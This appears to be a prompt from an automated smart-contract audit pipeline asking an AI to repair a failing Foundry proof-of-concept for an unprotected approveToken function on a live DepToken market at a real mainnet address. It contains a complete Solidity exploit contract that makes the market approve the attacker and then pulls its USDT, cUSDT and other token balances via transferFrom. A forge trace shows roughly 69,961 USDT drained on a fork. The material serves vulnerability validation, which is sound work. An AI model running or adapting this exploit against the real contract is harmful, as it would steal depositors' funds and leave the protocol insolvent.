You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: direct_or_existing_balance_first
- strategy_instructions: Prefer direct execution using verifier-held assets first. Only use temporary external funding if direct path is infeasible.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Public arbitrary-token approval lets any caller steal the market's USDT, cUSDT, and other ERC-20 balances
- claim: `approveToken` is a public function inherited by the live DepToken contract and has no access control. Any address can make the market approve an arbitrary spender for any ERC-20 held by the contract. Since the market custody includes idle USDT and Compound cUSDT, an attacker can approve themself and then use `transferFrom` on those token contracts to pull funds out of the protocol.
- impact: A permissionless attacker can drain the protocol's underlying USDT, its cUSDT position, and any other ERC-20 balance held by the market, immediately rendering depositors insolvent and breaking redemptions.
- exploit_paths: ["Call `approveToken(USDTAddress, attacker, amount)` or `approveToken(compoundV2cUSDTAddress, attacker, amount)` on the market.", "Call the approved token's `transferFrom(depToken, attacker, amount)` to move assets out of the protocol.", "Repeat for each token balance the market holds."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
}

interface IDepTokenApprovalBug {
    function approveToken(address token, address spender, uint256 amount) external returns (bool);
    function underlying() external view returns (address);
    function USDT_ADDRESS() external view returns (address);
    function USDC_ADDRESS() external view returns (address);
}

contract FlawVerifier {
    address internal constant TARGET = 0x7b190a928Aa76EeCE5Cb3E0f6b3BdB24fcDd9b4f;

    address internal constant CANONICAL_USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address internal constant CANONICAL_USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address internal constant CANONICAL_CUSDT = 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9;
    address internal constant CANONICAL_CUSDC = 0x39AA39c021dfbaE8faC545936693aC917d5E7563;

    IDepTokenApprovalBug internal constant TARGET_CONTRACT = IDepTokenApprovalBug(TARGET);

    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {}

    function executeOnOpportunity() external {
        address underlyingToken = _readAddress(
            abi.encodeWithSelector(IDepTokenApprovalBug.underlying.selector),
            CANONICAL_USDT
        );
        address usdtToken = _readAddress(
            abi.encodeWithSelector(IDepTokenApprovalBug.USDT_ADDRESS.selector),
            CANONICAL_USDT
        );
        address usdcToken = _readAddress(
            abi.encodeWithSelector(IDepTokenApprovalBug.USDC_ADDRESS.selector),
            CANONICAL_USDC
        );

        address[5] memory candidates = [underlyingToken, usdtToken, CANONICAL_CUSDT, usdcToken, CANONICAL_CUSDC];

        // Exploit path 1:
        // Call approveToken(USDTAddress, attacker, amount) on the live market.
        // Exploit path 2:
        // Call the approved token's transferFrom(depToken, attacker, amount).
        _approveAndPullFromMarket(usdtToken);

        // Exploit path 1 variant:
        // Call approveToken(compoundV2cUSDTAddress, attacker, amount) on the live market.
        // Exploit path 2:
        // Call the approved cUSDT token's transferFrom(depToken, attacker, amount).
        _approveAndPullFromMarket(CANONICAL_CUSDT);

        // Exploit path 3:
        // Repeat for each additional ERC20 balance currently held by the market.
        // These are realistic public discovery steps that preserve the same root cause:
        // a public arbitrary approval followed by token.transferFrom.
        for (uint256 i = 0; i < candidates.length; i++) {
            address token = candidates[i];
            if (_alreadySeen(candidates, i, token)) {
                continue;
            }
            _approveAndPullFromMarket(token);
        }

        _refreshProfit(candidates);
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _approveAndPullFromMarket(address token) internal {
        if (token == address(0)) {
            return;
        }

        uint256 marketBalance = _balanceOf(token, TARGET);
        if (marketBalance == 0) {
            return;
        }

        // The vulnerable public function ultimately performs ERC20 approve from the market itself.
        // Resetting to zero first keeps the exploit compatible with tokens like USDT that reject
        // non-zero to non-zero allowance changes. This is still the same exploit causality:
        // public approveToken, then transferFrom to steal the market's balance.
        require(TARGET_CONTRACT.approveToken(token, address(this), 0), "approve zero failed");
        require(TARGET_CONTRACT.approveToken(token, address(this), marketBalance), "approve amount failed");
        require(_rawTransferFrom(token, TARGET, address(this), marketBalance), "transferFrom failed");
    }

    function _refreshProfit(address[5] memory candidates) internal {
        _profitToken = address(0);
        _profitAmount = 0;

        for (uint256 i = 0; i < candidates.length; i++) {
            address token = candidates[i];
            if (_alreadySeen(candidates, i, token) || token == address(0)) {
                continue;
            }

            uint256 tokenBalance = _balanceOf(token, address(this));
            if (tokenBalance > _profitAmount) {
                _profitToken = token;
                _profitAmount = tokenBalance;
            }
        }
    }

    function _balanceOf(address token, address account) internal view returns (uint256 amount) {
        (bool ok, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (!ok || data.length < 32) {
            return 0;
        }
        return abi.decode(data, (uint256));
    }

    function _rawTransferFrom(address token, address from, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(
            abi.encodeWithSelector(IERC20Like.transferFrom.selector, from, to, amount)
        );
        if (!ok) {
            return false;
        }
        if (data.length == 0) {
            return true;
        }
        return abi.decode(data, (bool));
    }

    function _readAddress(bytes memory callData, address fallbackValue) internal view returns (address) {
        (bool ok, bytes memory data) = TARGET.staticcall(callData);
        if (!ok || data.length < 32) {
            return fallbackValue;
        }

        address decoded = abi.decode(data, (address));
        if (decoded == address(0)) {
            return fallbackValue;
        }
        return decoded;
    }

    function _alreadySeen(address[5] memory values, uint256 end, address needle) internal pure returns (bool) {
        if (needle == address(0)) {
            return true;
        }

        for (uint256 i = 0; i < end; i++) {
            if (values[i] == needle) {
                return true;
            }
        }

        return false;
    }
}

```

forge stdout (tail):
```
lanceOf(0x7b190a928Aa76EeCE5Cb3E0f6b3BdB24fcDd9b4f) [staticcall]
    │   │   ├─ [8757] 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9::0933c1ed(0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002470a082310000000000000000000000007b190a928aa76eece5cb3e0f6b3bdb24fcdd9b4f00000000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   ├─ [2600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(0x7b190a928Aa76EeCE5Cb3E0f6b3BdB24fcDd9b4f) [delegatecall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0
    │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(0x7b190a928Aa76EeCE5Cb3E0f6b3BdB24fcDd9b4f) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [3780] 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9::balanceOf(0x7b190a928Aa76EeCE5Cb3E0f6b3BdB24fcDd9b4f) [staticcall]
    │   │   ├─ [2257] 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9::0933c1ed(0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002470a082310000000000000000000000007b190a928aa76eece5cb3e0f6b3bdb24fcdd9b4f00000000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   ├─ [600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(0x7b190a928Aa76EeCE5Cb3E0f6b3BdB24fcDd9b4f) [delegatecall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0
    │   ├─ [9815] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(0x7b190a928Aa76EeCE5Cb3E0f6b3BdB24fcDd9b4f) [staticcall]
    │   │   ├─ [2529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(0x7b190a928Aa76EeCE5Cb3E0f6b3BdB24fcDd9b4f) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2553] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::balanceOf(0x7b190a928Aa76EeCE5Cb3E0f6b3BdB24fcDd9b4f) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 69961509697 [6.996e10]
    │   ├─ [5780] 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [4257] 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9::0933c1ed(0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002470a082310000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f00000000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   ├─ [2600] 0x3363BAe2Fc44dA742Df13CD3ee94b6bB868ea376::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0
    │   ├─ [3315] 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   ├─ [2529] 0xa2327a938Febf5FEC13baCFb16Ae10EcBc4cbDCF::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [2553] 0x39AA39c021dfbaE8faC545936693aC917d5E7563::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [301] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xdAC17F958D2ee523a2206206994597C13D831ec7
    ├─ [297] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 69961509697 [6.996e10]
    ├─ [1031] 0xdAC17F958D2ee523a2206206994597C13D831ec7::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 69961509697 [6.996e10]
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 69961509697 [6.996e10])
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 69961509697 [6.996e10])
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xdAC17F958D2ee523a2206206994597C13D831ec7)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 17484161 [1.748e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 11075 [1.107e4])
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 962.42ms (780.24ms CPU time)

Ran 1 test suite in 1.01s (962.42ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 244438)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
